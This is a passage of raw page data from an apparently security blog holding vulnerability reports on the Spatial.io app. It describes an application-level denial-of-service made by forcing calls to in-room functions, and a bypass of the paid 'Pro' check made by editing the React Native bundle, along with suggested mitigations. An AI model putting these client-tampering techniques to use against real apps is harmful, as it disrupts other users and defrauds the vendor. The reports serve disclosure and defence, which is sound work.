url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABTElEQVQY02WPQY4UMQxF6zSTGpKqSuLEcZKuzkyLkVpixIYjseIks4KbgLICasGCFWeAkWVUTINALJ78v2192YNz9NUu+PlKw3Ztwjb+R9zGKW7XU9jGv1B/ZrjvfRw1fFMa3gzVFbn1VbJNUmySOEdJMwrNKGn3vgn6LAVJciSJHgWBxM4owa5CcCOTy6JMEKXh7YAmyLrQ4/3tyq/OjV+eDtzojlu555bP3PILbnTmdSFG4zlq4Kj9PzzT8ENp2AMfhrpEKVN4rC7yMSDfRORsibOrTAsx2fxLlyU9BRpgvPBbaxO+Xy58GIrLckpFjilLwyzkqmQ4SoVVsj9IweeCvkmJSWh/GZKkS7UTSnRNwDfRlmQ04d2wzOmTC/QBS+5US5/h0Cc4deNbN/7Yp3DqxtY+aujKhK4MPKGhX+09Hfqow3ul4YvS/vVPGIi3QWY8tHwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"unity client React Native Code - bringUsersToMeHostToolAvailable function mutation\"\n        title=\"unity client React Native Code - bringUsersToMeHostToolAvailable function mutation\"\n        src=\"/static/725777a14a99881752e22f831e741687/37523/s-code-6.png\"\n        srcset=\"/static/725777a14a99881752e22f831e741687/e9ff0/s-code-6.png 180w,\n/static/725777a14a99881752e22f831e741687/f21e7/s-code-6.png 360w,\n/static/725777a14a99881752e22f831e741687/37523/s-code-6.png 720w,\n/static/725777a14a99881752e22f831e741687/6d2da/s-code-6.png 936w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>At the part where the target function is called, <code class=\"language-text\">conregateAroundActor</code> and <code class=\"language-text\">respawnOthersInHotspots</code> are operated as inputs capable of actually performing normal function attacks through continuous forced calls, preventing users in the same room from performing normal functions.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 83.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAAE0UlEQVQ4y3WUe0yTZxTGX0BkihQoVKrcRClUhYi3SltvIGVZlUVmlmzTzcVtZooOEZEpiLeKA0WoIChTQaeI4IQ5ZWq2ie6iThmoE5jlVtuN20eBVnr9vu9Z2uGS/eFJnpx/3vxyzvM+OQQAsYuQHCcyWpOnziUcYVSFMEKMiOCIwVDPgOFw7yDjRK8gladXSIWHe8Alb05wNZcbUu3pE+wQjx9a7eYxqZK0sBiXnE/nfl5sPLXtqOlccgHiouQpxHuK4OjsRBkiEmPp8ITFEKxYxM54cwkEcSKExosRKJsPftRMcDwC4MkNBG/iVLi5+4EUHj9Tm190Rnu3oaX98re3OhQ5xZq7d5riCddTKVwTC3FSIuatT8Dsj+VYkPQWJLs/YRZsWImg1VK4RASAkAkgzhxHdxrjDZKcmmUInyHGkmUrETUvBvKE1Thf+c2usZ5+ydzg0H4nL1+Vqw+/i3h4d/pOj3i+rrjohXvAFPUY7sROV0+/LmdXbqfzWJ8Ol7E+bc5uvn+S8q+qurduy0TW3i/otPTdlqyDR1BVc22f3ddg/0UcQlxcJr8dSk6vX0mQmhH4fFNSPZIPuBekv0eE8rkOz08DxHWOaPxr88XjiNli7bVZLbDRNhaAjTIbca+hSfHvRxEilsYlREuW1UVLZZVLxLFXt8av0IoXymokS9+oEklltW4c/31u7pPmEDcPwl0UQ4hG+3dvXV0d6uvr2fv37ttuP3yAh01//Af0C5yyOixyFqJE0RDOnovJ02dgKtcX0+zy5cGf44XxEzjNowFxIg2/N/XK4uIgl8tZsTjaVlCghKrjuaK1pc3xIkwYzhNGRqZFLpRujF8g2l0ilTyayeNlTfPx3SHg8XaE8fl7g/z9338ZOdL0+EnvqlWr8MHatax8udx2ovRLqDrUCvtwhJBIQkgIIYRPCPF5hxDh4NKltfOMIGWLXyd56VvJsUO5pOxEiSPLjH2rxsZHvbKYGCQmJLASkciWm3sI7Z2atMXRsdszMvfRGWtSDJnvrjOmbEk1lShydYOFR0fMz3pu276/X2ei+q4zQB1D0/UAljtsevDTLz3SWbMgk0hsUQKBOTsrC1RP32YAXhr1M/rins9QlpGEmsqzMLHArzcuolyxF799fQ03j+9HRXkZdPoRsAyT4gCqnjYPnDiSj1NFRSjMycEPV69B3aG2A/nNTx5b71xWoEC5i8nOK2DaurTMlYO72NPbNtAXqi/YLmUk28p3bre0a7sBFhsdQHV3n0xnMH6qMxjXDY2YP9L09K9P3ZnJBRDytKXVcr0wDXkpa9n92QegN4ygTa1G+1MV+ptaoWptZjs0GnpYbwDDMEkMwxAybLaSlwfCLnZUAMLaVK2mK0WHUavMY2vOl8NgolFZXY3ynMP4ubAUpTl7WKVSSQ8PGwAgyTFhHzXoTOkGXfoHBl3sXW944ToKFwwNUKZubRt0Q71Ml6qF7dfp2bLSY2xu+ia2Im0LW5K9hy0uyrcNUJQduPFldv9XLMs6jwLDhnSUrbGhEddv3MKPN7+D3mBATVUFzp48iQtnzuNc2VnUVFXBoB+2Aze/Cug0CgxhGPqvnj5qqL1LO0BRlI5lWZ3VSussFqtuxGTRmUwmnclkphiGsQD40A78BwBO8YpZDg+QAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"exploit\"\n        title=\"exploit\"\n        src=\"/static/0a396c68f0d6e07e65668f0940c0bc6b/37523/s-code-7.png\"\n        srcset=\"/static/0a396c68f0d6e07e65668f0940c0bc6b/e9ff0/s-code-7.png 180w,\n/static/0a396c68f0d6e07e65668f0940c0bc6b/f21e7/s-code-7.png 360w,\n/static/0a396c68f0d6e07e65668f0940c0bc6b/37523/s-code-7.png 720w,\n/static/0a396c68f0d6e07e65668f0940c0bc6b/302a4/s-code-7.png 1080w,\n/static/0a396c68f0d6e07e65668f0940c0bc6b/2cefc/s-code-7.png 1400w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>*<em>Attacker(Hosts <em>n)? DOS</em></em></p>\n<ul>\n<li>If an attacker takes advantage of multiple sessions to perform a DOS vulnerability to general users (victims), not hosts in the Target Room, unlike in a single host, the actual GPU usage increases rapidly in proportion to the DOS attack efficiency.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">n*Hosts = n*DOS</code></pre></div>\n<p><strong>Application Level DOS attack based on Pro Feature(Congregate Around Actor, Respawn) POC Video (GPU Process Usage Rate Check)</strong></p>\n<ul>\n<li>In the case of a DOS attack on platforms in other environments, RN-side calls UserVector function through internal Unity RPC communication to forcibly modify the user’s location, and the GPU system used by the GPU device, such as Toast and Client-side management, is rapidly increasing.</li>\n</ul>\n<p><strong>Application Level DOS attack based on Pro Feature(Congregate Around Actor, Respawn) POC Video (Attack)</strong></p>\n<h3 id=\"any-additional-information\" style=\"position:relative;\"><a href=\"#any-additional-information\" aria-label=\"any additional information permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Any additional information?</h3>\n<p><strong>Mitigation 1: congregateAroundActor, respawnOthersInHotspots Feature message Security (Solving the authentication problem using the gRPC service.)</strong></p>\n<ul>\n<li>In the internal structure of the spatial server, it operates in the form of RN-side calling the internal Function Service implemented as Unity Engine through RPC communication, and functions requiring actual authentication use RESET API (Unity Request), but functions that do not require authentication are based on RN-side.</li>\n<li>If the process of verifying authentication rights using the RESET API is omitted, the Third Party RPC can be used to call the Google Cloud PubSub API to prevent attacks by returning it as an authentication error unless the code is corrected on the RN-side.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#attack-type\">Attack Type</a></p>\n</li>\n<li>\n<p><a href=\"#attack-effect\">Attack Effect</a></p>\n</li>\n<li>\n<p><a href=\"#vulnerability-detected-location\">Vulnerability Detected Location</a></p>\n</li>\n<li>\n<p><a href=\"#attack-point\">Attack Point</a></p>\n<ul>\n<li><a href=\"#reactnative-indexandroidbundle\">ReactNative index.android.bundle</a></li>\n<li><a href=\"#react-native-javascript-side-ipc-to-unity-rpc\">React Native Javascript Side IPC to Unity (RPC)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#vulnerability-details\">Vulnerability Details</a></p>\n<ul>\n<li><a href=\"#normal-flow-unity-ipc-rn-side-to-congregatearoundactor-respawnothersinhotspots-function-defined\">normal flow (Unity IPC, RN Side to congregateAroundActor, respawnOthersInHotspots function defined)</a></li>\n<li><a href=\"#the-functional-part-implemented-on-the-rn-side-congregatearoundactor-respwnothersinhotspots\">The functional part implemented on the RN-side (congregateAroundActor, respwnOthersInHotspots)</a></li>\n<li><a href=\"#target-feature-dos-poc-code-injection\">Target Feature DOS POC (Code Injection)</a></li>\n<li><a href=\"#any-additional-information\">Any additional information?</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"Attack Type Client Side Code Injection Application-Level Denial-of-Service (DoS) App Crash Malformed Android Intents Attack Effect Application Level DOS Due to the Application Level DoS attack, normal functions operate the service abnormally, resulting in financial losses and time value investment, while reducing the reliability of the company. Vulnerability Detected Location index.android.bundle Congregate Around Actor feature Respawn Other In Host spots feature iL2cpp.so SessionRPC Attack Poi…","frontmatter":{"date":"July 12, 2022","title":"Spatial.io Application Level DOS attack based on Pro Feature 0-day vulnerability report","categories":"0-day","author":"Zer0Luck","emoji":"👻"},"fields":{"slug":"/spatial-bypass-feature/"}},"next":{"id":"1f275949-23cc-5de2-aab3-27831f11e2fb","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACqklEQVQozwGfAmD9AIwxXYsxXYsxWIovV4wxX5Y4bZU6bJY7bpc7dJEzaJM7cpc/dZg7cZk5cZc3bIwuWYwwVYwxVY0wV40wVwCNL1qOLlmMMlmLMlaUPGuYPnKVPHGYPXeUPXmDM2KVPHGaQ3qbQHaaP3ScP3eUN2iLMVKMM1SMMFWKLlIAjTJihTlsjCdbjS5fkzRqjzBlkzRvkS9uhjBodjhvjS5njzJukzVxkzVtlDRskzJpiy1cjChZiitZkjhlAI0za5JwqMyXvMSUsMeVssmXtLOAn8qXtsiVr9Cbu8yauMiVs8iVuMWTtMaSssaSscaWtc2YuKlkjpc3bgCPJV7FiKn////8+vv///+YnZo2OziipqT5/fvg5uPk6ebr8O35+/r////////////+/P3////Uq8GSJloAkDFtw5Gy/////fv8////WVlZHh8eZ2po1dfWsbCwvLu7wsTD4ePi8vLx8fHx8fPy/Pz8////2LPMlzl2AI85bbd8offv9PDk6/nu9se+wm1oa82+xvLi6ubm6Ofo6efZ4OLV3OPh5tvV2ePZ4PDk6/jx9caeuJY+egCVRHaVQXidToGcUIOZRXKBSm+ciqy0hKCQY36qhayrhKiXQ3Gob5axlLdmQ0mWUXelU42nUI6TVmmERmEAkUN1k0F0kj9xjThphy1dbC5bSE55mlKDl098l0R+mUR/nkJ8tFqQmVuEW0ZVhjVekDdwkkJ8aVNPX09FAKVLgJ5TgpNJco01Yo85Z4Q6alc8Y4UzbIo3cIk5cog4cY08dJI4c3U4ZUdHU3g3X44wYJZTcGVcUFFSQwDFUYWxVIyeSICLOmyPPHKOPXeNPXaNPnmNPHmOPXqQPnqOPHmTP31+PHJeT1KWYmqVP3GtUnt9Tl5FRDiH0WAaqVAjMgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Spatial-Features-Bypass\"\n        title=\"Spatial-Features-Bypass\"\n        src=\"/static/77fd57e7440f9a6d6be95dd707dd74d6/37523/s-commerence-2.png\"\n        srcset=\"/static/77fd57e7440f9a6d6be95dd707dd74d6/e9ff0/s-commerence-2.png 180w,\n/static/77fd57e7440f9a6d6be95dd707dd74d6/f21e7/s-commerence-2.png 360w,\n/static/77fd57e7440f9a6d6be95dd707dd74d6/37523/s-commerence-2.png 720w,\n/static/77fd57e7440f9a6d6be95dd707dd74d6/e996b/s-commerence-2.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h2>\n<p>During last year’s research, we conducted vulnerability analysis targeting metaverse-based commercial platforms. Among them, we would like to share some of the vulnerabilities that have been reported to the target company and have passed over time.\nWhen you think of the real metaverse as a category, you can see that all technologies are gathered in one place and are harmonious. Among them, based on mobile and VR equipment, you will feel closer to the three major elements of the metaverse: SPACE, AVATAR, and ITEM. However, depending on how each element is implemented and used, vulnerabilities and attack vectors occur, resulting in metaverse hacking, causing great damage.\nIn this story, we will describe some of the several vulnerability analysis reports based on the <a href=\"https://spatial.io/\">https://spatial.io/</a> platform.</p>\n<h2 id=\"summary-titile\" style=\"position:relative;\"><a href=\"#summary-titile\" aria-label=\"summary titile permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary Titile</h2>\n<ul>\n<li>Pro Feature Bypass</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 74.44444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEJklEQVQ4yzWUe0xbVRzHT3wtRucfjDjcEBgMkUdwG4lAg/4hbQjoErXxkcyAMziMj81FIwEViLgXIWhHskkINt2ShYQUAXmNCRvZkAVaoaylTyj0RVtoe9vewoV7e7/mXthJfjm/X05+n3zOLzmH5FRMkrNt+PiTBkp3rjV4v/rX0FxlE3sNANmLCioavTVvs/255HIprfYVpcliFcNisynnDYvKre3tmwDalpbtB8ic3nRBeUPl+Wdi3GRctlm1CwvmPzquOwaHh+8CeMLpWZsofVuOxAIJ3ih7F29KSlHwchYKUrLwemo2khJTUSE/hU2GgdPhOEUGR8em3jl5EmVSKWp+PIfyj+TIzcpAY0N9HMDRWz29/YTsw77nk5hDqTns4bRcNuFgBvviS5lsclouS8j+HUKe2jaYrQhurFcR55rvjt1uh9FoZE0mc/yRXs8ZFw2wWG1Rg8maPnZ38u/kI3lITslhj7xynM979Rg+LCpCVtZxpGedwMFDmfzh1Jz4ssMJv89bSSh6a3x7ZwcURXGhUAg0TQtmoDeZWFNDc0Y8zg0uWqyYntGy0/OP8N/obVhrTkNz/wEezi1gelbLG622OM/zMJvNVSQYpseDwSBWV1c5t9sNmo6JwGCEjn3127UUAP31P12AVCZnZe9X4edyORzZ2fi64gOUy0/jLel7/MVLV8WexcXFXSBFhWG327mN9XXsMFtxdjOGoNdPd31afSIei423/n4dn9d8y33xzQ9orP8FLtUN1NU24cuztaiuOc+3KjpEoNForCKBPcNgiOICrlUExv7i3Y21WJaWcqa0tIj7zBkwDMNHwmGhB55oRNw3tzYRo6NCynvC1K6hABQM/T4fvF4v53M7EbYY+MjUJFwq1daDnNyLzPCwbWr6IS5fuhxXKBSYuHdPBA4NDaHlSgsUCgU/q9WKQL1evwuMxmIIhcNcKBIBB4iHEYA+oB5NBNCrUqlQXFzMSiQSdHR0iMDm5maUlJRAIpHwfX19Yo9OpxOA0XF6YwPU2hoX9npB+33xyEYE675ArO7895kABru7uyGVSlmZTAalUikCW1tbUVZWBplMxg8NDYnAhYWFKhIIUHcoiwVeg2HHqdNxIauFteoccC27I3UtV9IBDHR1daGwsJAtKiri29vbeWFuTU1NvGBXWFjI9/T0cAJwfn6+UrjyvxGvF+srKwg5XYiHw4gFaQQ2KDS2tB0FcNvj8UCj0XAajQYul0s0FB6DUGu1Wvj9ftHQbDZ/Rtz+wHer7jWjbcWhdfv8c/5gSBugKL1lyT5MCHkWwFXsLlYwE4JlWf5xjr2ZMwzDTExMSMUfhZCnn0tISNpPCHkcLxDhAQNkZmb2mZGRkTy1Wv1ab29v/sDAQP7IyEh+f39/vlCr1WqhPtbZ2ZlJCHnyfzzXZa8L+PjiAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"React Native Code Modify Features\"\n        title=\"React Native Code Modify Features\"\n        src=\"/static/be0358fbdc629611c0cdf49f8233552c/37523/s-code-8.png\"\n        srcset=\"/static/be0358fbdc629611c0cdf49f8233552c/e9ff0/s-code-8.png 180w,\n/static/be0358fbdc629611c0cdf49f8233552c/f21e7/s-code-8.png 360w,\n/static/be0358fbdc629611c0cdf49f8233552c/37523/s-code-8.png 720w,\n/static/be0358fbdc629611c0cdf49f8233552c/9d5da/s-code-8.png 871w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"attack-type\" style=\"position:relative;\"><a href=\"#attack-type\" aria-label=\"attack type permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Type</h2>\n<ul>\n<li>Client Side Code Injection (Clacking)</li>\n</ul>\n<h2 id=\"attack-effect\" style=\"position:relative;\"><a href=\"#attack-effect\" aria-label=\"attack effect permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Effect</h2>\n<ul>\n<li>Normal operation function bypass (Pro function: Paid version function bypass)</li>\n<li>By bypassing the Pro function, it can be used without the purchase process of the actual Pro/Team: <code class=\"language-text\">$240.00/year and $25.00/month</code>, resulting in financial damage in terms of the target service.</li>\n<li>Mobile operates the same in VR equipment, so there is a concern that one platform target will have a financial impact even in various platform environments.</li>\n</ul>\n<h2 id=\"vulnerability-detected-location\" style=\"position:relative;\"><a href=\"#vulnerability-detected-location\" aria-label=\"vulnerability detected location permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability Detected Location</h2>\n<ul>\n<li>Android/io.spatial.spatial</li>\n<li>/data/app/io.spatial.spatial-Ah0l8y0agajyPsJ-biIlRg==/base.apk</li>\n<li>React Native Side (index.android.bundle)</li>\n</ul>\n<h2 id=\"attack-point\" style=\"position:relative;\"><a href=\"#attack-point\" aria-label=\"attack point permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Point</h2>\n<p><strong>ReactNative index.android.bundle</strong></p>\n<ul>\n<li>Facebook, Hermes JavaScript Engine Migration → ReactNative</li>\n<li><code class=\"language-text\">index.android.bundle</code> file serves as an interface function with the main source code, and some formats can be modified because the code does not have Javascript obfuscation and symbol values.</li>\n<li>By modifying the <code class=\"language-text\">index.android.bundle</code> file, it is possible to induce and reversing abnormal operation by cracking various functions processed in the actual client environment.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">- base\n    - assets\n        - index.android.bundle</code></pre></div>\n<h2 id=\"vulnerability-description\" style=\"position:relative;\"><a href=\"#vulnerability-description\" aria-label=\"vulnerability description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability Description</h2>\n<h2 id=\"react-native-javascript-interface-user-pro-function-check-logic-bypass\" style=\"position:relative;\"><a href=\"#react-native-javascript-interface-user-pro-function-check-logic-bypass\" aria-label=\"react native javascript interface user pro function check logic bypass permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>React Native Javascript: Interface User Pro Function Check Logic Bypass</h2>\n<p><strong>Pro Check Object (pro value)</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\">e<span class=\"token punctuation\">.</span>isUserPro <span class=\"token operator\">=</span> ture<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span></code></pre></div>\n<ul>\n<li>It is an object used as a branch that can determine whether the user functions as a Pro through the isUserPro object.</li>\n<li>Through the object, it is possible to determine whether the Pro function can be used.</li>\n</ul>\n<p>b\n<strong>normal flow (React Native Javascript: index.android.bundle)</strong>\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 49.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABqElEQVQoz42R3Y7TMBCF+zKtk4zt2Bn/JqQtlYrgGfd2xS2vAeWKXaLtDT/PQRkNctruitVKcPFpRmP76BzPQtr8AWz6BibeS5smaeIEbZikzVOt/FQBTuLf3AvAHwLwdqHN8B3twANmjjZx6Ab2NjPoxNBmNiZxJZEr6WYEuMf+OQLwy6KR+BC7DW/D/vQqbUmbTLUKBNoRaE+N8rRskJZ1RwKQKunm+ozTRfCwqKQ7go484pp2Yc1jV5xmXo8bfrff8W674ZR6znngWvny6CVnvy/18yxYLlaAVANyIx1DOWyQG+0ZtGdlwsxZAF+K+yTYtOFYKceVciSKA+V4JZFr7XnVdLxscK4zUPoLcEaceRI0OB5dfss27Ci4Laf4htOwZ4M9S3N21+jIdVmSDqxsYGkCS+1ZKs9Q+MuhCg/GbNiY8RR0ImMGcm5HiJli31PIPWkcSeFr6rrzzOeeHCZybSRsI1kdfj0uRZr4E9ry2d3Ffolp51jLGufIoulmSsTr7Br5ykXwbtGZ9D6adGd0+BR0PLTSHVaAhwrwIP6fjwLwq4Du5g/6WiwXEzdiLwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Normal Flow\"\n        title=\"Normal Flow\"\n        src=\"/static/baf9e3d7d25857a9cae45777ec39363e/37523/s-code-9.png\"\n        srcset=\"/static/baf9e3d7d25857a9cae45777ec39363e/e9ff0/s-code-9.png 180w,\n/static/baf9e3d7d25857a9cae45777ec39363e/f21e7/s-code-9.png 